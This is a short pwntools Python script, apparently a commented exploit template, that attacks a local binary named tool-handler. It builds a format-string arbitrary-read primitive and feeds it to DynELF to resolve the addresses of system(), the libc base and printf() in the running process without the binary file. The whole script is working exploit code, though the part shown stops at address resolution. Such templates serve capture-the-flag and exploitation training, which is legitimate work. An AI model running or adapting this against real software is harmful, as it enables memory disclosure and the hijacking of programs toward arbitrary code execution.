#!/usr/bin/env python3
from pwn import *

io = process("/mnt/dev/tool-handler")

io.recvuntil(b"main @ ")
known_ptr = int(io.recvline().strip(), 16)

# ── 3. Define a leak primitive ─────────────────────────────────────────────
#    Must: take an address, return ≥1 byte of memory at that address.
#    How you implement this depends on the vulnerability (fmt string, OOB…)
def leak(addr):
    # --- example: format string arbitrary-read ---
    payload = f"%7$s|".encode() + p64(addr)   # adjust offset
    io.sendline(payload)
    data = io.recvuntil(b"|", drop=True)
    log.debug(f"leak({hex(addr)}) -> {data.hex()}")
    return data or b"\x00"

# ── 4. Build DynELF — NO binary file needed ────────────────────────────────
d = DynELF(leak, known_ptr)
# pwntools will warn "No ELF provided" — that's fine and expected.

# ── 5. Resolve any function address at runtime ─────────────────────────────
system_addr = d.lookup('system', 'libc')
log.success(f"system() @ {hex(system_addr)}")

# Resolve the base address of libc itself:
libc_base = d.lookup(None, 'libc')
log.success(f"libc base @ {hex(libc_base)}")

# Resolve a symbol directly in the binary's own libraries:
# (give DynELF a pointer *into* libc instead of the binary)
d2 = DynELF(leak, libc_base + 0x1000)
printf_addr = d2.lookup('printf')
log.success(f"printf() @ {hex(printf_addr)}")
